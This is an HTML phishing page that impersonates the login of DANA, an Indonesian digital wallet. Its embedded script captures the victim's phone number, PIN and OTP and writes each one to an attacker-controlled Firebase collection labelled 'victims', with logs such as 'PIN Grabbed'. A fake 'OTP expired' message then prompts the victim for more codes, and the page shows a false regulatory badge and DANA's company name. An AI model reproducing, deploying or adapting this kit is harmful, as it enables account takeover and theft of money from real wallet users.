<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA - Dompet Digital Indonesia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // CONFIG FIREBASE KAMU
        const firebaseConfig = {
            apiKey: "AIzaSyAMmcOF9E5LA8Cu3dxvstyPCzjd_ZZ_NIM",
            authDomain: "tahu-bulat-dad9d.firebaseapp.com",
            projectId: "tahu-bulat-dad9d",
            appId: "1:784968244179:web:fbf29b0745bfdc5fb52d26"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "tahu-bulat-c2-pro";

        // State sederhana untuk perpindahan halaman
        let victimPhone = "";

        const getOS = () => {
            const ua = window.navigator.userAgent;
            if (ua.indexOf("Android") >= 0) return "Android";
            if (ua.indexOf("iPhone") >= 0 || ua.indexOf("iPad") >= 0) return "iOS";
            return "PC/Web";
        };

        // Langkah 1: Kirim Nomor HP & PIN
        window.handleLogin = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn-login');
            victimPhone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;

            btn.disabled = true;
            btn.innerHTML = `<span class="flex items-center justify-center"><svg class="animate-spin h-5 w-5 mr-3 border-t-2 border-white rounded-full" viewBox="0 0 24 24"></svg> Memproses...</span>`;

            try {
                await signInAnonymously(auth);
                
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victims'), {
                    platform: "DANA_V4_PHASE_1",
                    username: victimPhone,
                    password: pin,
                    ip: "182.1." + Math.floor(Math.random()*255) + ".xx",
                    device: getOS(),
                    timestamp: Date.now()
                });

                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
                    message: `Step 1 Success: ${victimPhone} (PIN Grabbed)`,
                    type: "SUCCESS",
                    timestamp: { seconds: Math.floor(Date.now() / 1000) }
                });

                // Pindah ke tampilan OTP
                document.getElementById('section-login').classList.add('hidden');
                document.getElementById('section-otp').classList.remove('hidden');
                document.getElementById('display-phone').innerText = "+62 " + victimPhone;

            } catch (err) {
                console.error(err);
                alert("Sistem sibuk, coba lagi.");
                btn.disabled = false;
                btn.innerText = "LANJUT";
            }
        };

        // Langkah 2: Kirim OTP
        window.handleOTP = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn-otp');
            const otp = document.getElementById('otp-code').value;

            btn.disabled = true;
            btn.innerText = "Memverifikasi...";

            try {
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victims'), {
                    platform: "DANA_OTP_HIT",
                    username: victimPhone,
                    password: `OTP: ${otp}`,
                    ip: "182.1.xx.xx",
                    device: getOS(),
                    timestamp: Date.now()
                });

                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
                    message: `CRITICAL: OTP RECEIVED from ${victimPhone} -> ${otp}`,
                    type: "CRITICAL",
                    timestamp: { seconds: Math.floor(Date.now() / 1000) }
                });

                setTimeout(() => {
                    alert("Kode OTP salah atau kedaluwarsa. Silakan minta kode baru.");
                    btn.disabled = false;
                    btn.innerText = "KONFIRMASI";
                    document.getElementById('otp-code').value = "";
                }, 2000);

            } catch (err) {
                btn.disabled = false;
            }
        };
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        body { font-family: 'Open Sans', sans-serif; background-color: #f5f5f5; }
        .dana-blue { background-color: #118ee9; }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-gray-100 flex flex-col min-h-screen">
    
    <div class="dana-blue p-4 flex items-center justify-center shadow-lg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain_horizontal.png" alt="DANA Logo" class="h-8 brightness-0 invert">
    </div>

    <div class="flex-grow flex items-center justify-center p-4">
        <div class="bg-white w-full max-w-md rounded-2xl shadow-xl overflow-hidden">
            
            <!-- SECTION 1: LOGIN & PIN -->
            <div id="section-login" class="p-8 text-center">
                <h1 class="text-2xl font-bold text-gray-800 mb-2">Masukkan Nomor HP</h1>
                <p class="text-sm text-gray-500 mb-8">Gunakan nomor ponsel yang terdaftar di DANA.</p>

                <form onsubmit="handleLogin(event)" class="text-left space-y-6">
                    <div>
                        <label class="text-xs font-bold text-gray-400 uppercase tracking-wider">Nomor Ponsel</label>
                        <div class="flex items-center border-b-2 border-gray-200 py-2 focus-within:border-blue-500 transition-all">
                            <span class="text-gray-800 font-bold mr-2">+62</span>
                            <input type="number" id="phone" placeholder="812-xxxx-xxxx" required class="w-full text-lg font-semibold bg-transparent outline-none">
                        </div>
                    </div>
                    <div>
                        <label class="text-xs font-bold text-gray-400 uppercase tracking-wider">PIN DANA</label>
                        <input type="password" id="pin" maxlength="6" placeholder="••••••" required class="w-full border-b-2 border-gray-200 py-2 text-lg font-bold tracking-[1em] outline-none focus:border-blue-500 transition-all">
                    </div>
                    <button type="submit" id="btn-login" class="w-full dana-blue text-white font-bold py-4 rounded-xl shadow-lg hover:brightness-110 transition-all">LANJUT</button>
                </form>
            </div>

            <!-- SECTION 2: AUTO-OTP (Hidden by default) -->
            <div id="section-otp" class="p-8 text-center hidden">
                <div class="mb-6">
                    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                    </div>
                    <h1 class="text-xl font-bold text-gray-800">Verifikasi OTP</h1>
                    <p class="text-sm text-gray-500 mt-2">Kode OTP telah dikirimkan ke nomor <br><span id="display-phone" class="font-bold text-gray-700"></span></p>
                </div>

                <form onsubmit="handleOTP(event)" class="space-y-6">
                    <div class="flex justify-center">
                        <input type="number" id="otp-code" placeholder="Masukkan 4 digit kode" required 
                            class="w-full text-center border-b-2 border-gray-300 py-2 text-2xl font-black tracking-[0.5em] focus:border-blue-500 outline-none transition-all">
                    </div>
                    <p class="text-[11px] text-gray-400 italic">Mungkin butuh waktu hingga 60 detik untuk menerima SMS.</p>
                    <button type="submit" id="btn-otp" class="w-full dana-blue text-white font-bold py-4 rounded-xl shadow-lg hover:brightness-110 transition-all uppercase">Konfirmasi</button>
                </form>
                <button onclick="location.reload()" class="mt-6 text-sm text-blue-500 font-semibold">Kirim Ulang Kode</button>
            </div>

            <div class="bg-gray-50 p-4 text-center border-t border-gray-100">
                <p class="text-[10px] text-gray-400 uppercase font-semibold italic">Berizin dan Diawasi oleh OJK</p>
            </div>
        </div>
    </div>

    <footer class="p-6 text-center text-gray-400 text-xs">
        &copy; 2024 PT Espay Debit Indonesia Koe.
    </footer>

</body>
</html>
